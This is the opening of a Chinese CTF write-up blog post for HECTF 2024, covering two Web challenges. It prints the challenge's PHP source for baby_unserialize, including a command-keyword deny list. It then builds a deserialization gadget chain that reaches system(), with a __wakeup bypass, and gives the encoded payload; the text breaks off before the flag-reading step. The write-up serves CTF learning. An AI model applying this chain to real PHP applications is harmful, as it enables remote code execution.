



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta name="referrer" content="no-referrer"/>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="Game" />


<link rel="canonical" href="http://blog.g01den.top/posts/de34fe7b.html">



  <title>
【2024】HECTF-个人整理向 - CTFer的比赛之路 |
golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
<meta name="generator" content="Hexo 7.2.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">【2024】HECTF-个人整理向
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2024-12-09 20:59:36">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2024-12-09T20:59:36+08:00">2024-12-09</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://s2.loli.net/2024/12/09/DfPey5as3WvUC6n.jpg">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Game/" itemprop="item" rel="index" title="分类于 CTFer的比赛之路"><span itemprop="name">CTFer的比赛之路</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/de34fe7b.html">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="g01den">
    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="golden的部落阁">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p><ul class="markdownIt-TOC">
<li><a href="#wp">WP：</a>
<ul>
<li><a href="#web">Web：</a>
<ul>
<li><a href="#are-you-happy">Are you happy?：</a></li>
<li><a href="#baby_unserialize">baby_unserialize：</a></li>
<li><a href="#baby_sql">baby_sql：</a>
<ul>
<li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">非预期：</a></li>
<li><a href="#%E9%A2%84%E6%9C%9F%E8%A7%A3">预期解</a></li>
</ul>
</li>
<li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99">你一个人专属的进货网站：</a></li>
<li><a href="#ezweb">ezweb</a></li>
<li><a href="#ezjava">ezjava：</a></li>
</ul>
</li>
<li><a href="#misc">Misc：</a>
<ul>
<li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85">简单的压缩包：</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a>
<ul>
<li><a href="#sign-in">sign in</a></li>
<li><a href="#find-eggy">find eggy：</a></li>
<li><a href="#arcaea_sorting">Arcaea_Sorting：</a></li>
<li><a href="#arcaea_sorting_revenge">Arcaea_Sorting_Revenge：</a></li>
</ul>
</li>
<li><a href="#re">Re：</a>
<ul>
<li><a href="#babyre">babyre：</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto：</a>
<ul>
<li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89">迷茫的艾米莉</a></li>
<li><a href="#seven-more">seven more</a></li>
<li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB">翻一翻：</a></li>
<li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF">不合格的魔药：</a></li>
<li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6">情书与破碎的证书</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E8%AE%B0%E5%BD%95">题目描述记录：</a>
<ul>
<li><a href="#web-2">Web：</a>
<ul>
<li><a href="#are-u-happy"><strong>Are u happy</strong></a></li>
<li><a href="#baby_sql-2"><strong>baby_sql</strong></a></li>
<li><a href="#baby_unserialize-2"><strong>baby_unserialize</strong></a></li>
<li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-2"><strong>你一个人专属的进货网站</strong></a></li>
<li><a href="#ezweb-2"><strong>ezweb</strong></a></li>
<li><a href="#ezjava-2">ezjava</a></li>
</ul>
</li>
<li><a href="#re-2">Re</a>
<ul>
<li><a href="#babyre-2"><strong>babyre</strong></a></li>
<li><a href="#littleasm"><strong>littleasm</strong></a></li>
<li><a href="#pepy"><strong>PE?py?</strong></a></li>
<li><a href="#easyree"><strong>easyree</strong></a></li>
<li><a href="#ezandroid"><strong>ezAndroid</strong></a></li>
</ul>
</li>
<li><a href="#pwn-2">Pwn</a>
<ul>
<li><a href="#sign-in-2"><strong>sign in</strong></a></li>
<li><a href="#find-eggy-2"><strong>find eggy</strong></a></li>
<li><a href="#arcaea_sorting-2"><strong>Arcaea_Sorting</strong></a></li>
<li><a href="#arcaea_sorting_revenge-2"><strong>Arcaea_Sorting_Revenge</strong></a></li>
<li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5"><strong>喵喵喵</strong></a></li>
<li><a href="#lip"><strong>lip</strong></a></li>
</ul>
</li>
<li><a href="#crypto-2">Crypto</a>
<ul>
<li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-2"><strong>迷茫的艾米莉</strong></a></li>
<li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-2"><strong>翻一翻</strong></a></li>
<li><a href="#seven-more-2"><strong>seven more</strong></a></li>
<li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-2"><strong>情书与破碎的证书</strong></a></li>
<li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-2"><strong>不合格的魔药</strong></a></li>
</ul>
</li>
<li><a href="#misc-2">Misc</a>
<ul>
<li><a href="#rem_you"><strong>Rem_You</strong></a></li>
<li><a href="#funny"><strong>funny</strong></a></li>
<li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-2"><strong>简单的压缩包</strong></a></li>
<li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93"><strong>恶势力的仓库</strong></a></li>
<li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95"><strong>恶势力的聊天记录</strong></a></li>
<li><a href="#baby_unserialize-3"><strong>baby_unserialize</strong></a></li>
<li><a href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-3"><strong>你一个人专属的进货网站</strong></a></li>
<li><a href="#ezweb-3"><strong>ezweb</strong></a></li>
<li><a href="#ezjava-3">ezjava</a></li>
</ul>
</li>
<li><a href="#re-3">Re</a>
<ul>
<li><a href="#babyre-3"><strong>babyre</strong></a></li>
<li><a href="#littleasm-2"><strong>littleasm</strong></a></li>
<li><a href="#pepy-2"><strong>PE?py?</strong></a></li>
<li><a href="#easyree-2"><strong>easyree</strong></a></li>
<li><a href="#ezandroid-2"><strong>ezAndroid</strong></a></li>
</ul>
</li>
<li><a href="#pwn-3">Pwn</a>
<ul>
<li><a href="#sign-in-3"><strong>sign in</strong></a></li>
<li><a href="#find-eggy-3"><strong>find eggy</strong></a></li>
<li><a href="#arcaea_sorting-3"><strong>Arcaea_Sorting</strong></a></li>
<li><a href="#arcaea_sorting_revenge-3"><strong>Arcaea_Sorting_Revenge</strong></a></li>
<li><a href="#%E5%96%B5%E5%96%B5%E5%96%B5-2"><strong>喵喵喵</strong></a></li>
<li><a href="#lip-2"><strong>lip</strong></a></li>
</ul>
</li>
<li><a href="#crypto-3">Crypto</a>
<ul>
<li><a href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-3"><strong>迷茫的艾米莉</strong></a></li>
<li><a href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-3"><strong>翻一翻</strong></a></li>
<li><a href="#seven-more-3"><strong>seven more</strong></a></li>
<li><a href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-3"><strong>情书与破碎的证书</strong></a></li>
<li><a href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-3"><strong>不合格的魔药</strong></a></li>
</ul>
</li>
<li><a href="#misc-3">Misc</a>
<ul>
<li><a href="#rem_you-2"><strong>Rem_You</strong></a></li>
<li><a href="#funny-2"><strong>funny</strong></a></li>
<li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-3"><strong>简单的压缩包</strong></a></li>
<li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93-2"><strong>恶势力的仓库</strong></a></li>
<li><a href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95-2"><strong>恶势力的聊天记录</strong></a></li>
</ul>
</li>
</ul>
</li>
</ul>
(这里写目录标题)<br>
 本来想整理下所有的 wp 的，结果最后发现好多都不会，别的不会的抄 wp 的话似乎也就只有抄大佬们交上来的 wp，不大好，所以最后只写了部分 wp，剩下等到学长们把官方 wp 传上去再整理。</p>
<h1 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP：</h1>
<h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web：</h2>
<h3 id="are-you-happy"><a class="markdownIt-Anchor" href="#are-you-happy">#</a> Are you happy?：</h3>
<p>​		game.js 里找，flag 在里面，根据 flag 的格式，flag 开头是 HECTF，将这个字段 base64 编码下，然后就可以搜索了。</p>
<h3 id="baby_unserialize"><a class="markdownIt-Anchor" href="#baby_unserialize">#</a> baby_unserialize：</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag in /flag&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;temp = <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="title function_ invoke__">func1</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;temp === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cls-&gt;str1 = <span class="variable language_">$this</span>-&gt;str3;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have fun&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">flag in /flag</span><br></pre></td></tr></table></figure>
<p>​		首先是从有 system 的函数开始看，首先就是需要有能够触发 class02 <code>__involk</code>  的地方，这里就需要找到其他的动态函数调用的点，在 class00 的 <code>__set</code>  处找到了，之后在 class01 的 <code>__tostring</code>  里找到了，也就是 <code>$this-&gt;cls-&gt;str1 = $this-&gt;str3;</code> ，不过，这里需要将 cls 修改成 class00 才行，之后再往上，有个比较， <code>if ($this-&gt;temp === 1)</code>  这里需要想办法让表达式为 True，刚好，class00 里面的 <code>__call</code>  可以返回 1，并且 <code>$this-&gt;temp = $this-&gt;cls-&gt;func1();</code>  调用了 cls 里面不存在的方法；之后往回看，我们的目的是找到 wakeup 或者 destruct 等等魔术方法，所以还得继续找， <code>__tostring</code>  能够触发的点，看到 User 类，里面找到了 <code>echo $this-&gt;msg;</code>  这里的 msg 是可控的，刚好，可以用来输出操作，也就是把类当作字符串操作，之后就是想办法绕过 check 函数即可，绕过 <code>__wakeup</code>  即可打出组合拳：</p>
<p>​		首先是获得前置 payload，也就是序列化链子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;msg = <span class="keyword">new</span> <span class="title function_ invoke__">class01</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;cls = <span class="keyword">new</span> <span class="title function_ invoke__">class00</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3 = <span class="keyword">new</span> <span class="title function_ invoke__">class02</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3-&gt;payload = <span class="string">&quot;payload&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		之后，通过信息搜集，发现了 PHP 版本是 5.4，存在成员个数不同绕过 <code>__wakeup</code>  的方法，可以直接干，将上面的 payload 修改一下，然后 base64 编码即可：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0=</span></span><br></pre></td></tr></table></figure>
<p>​		好了，之后就是读取 flag 了：</p>
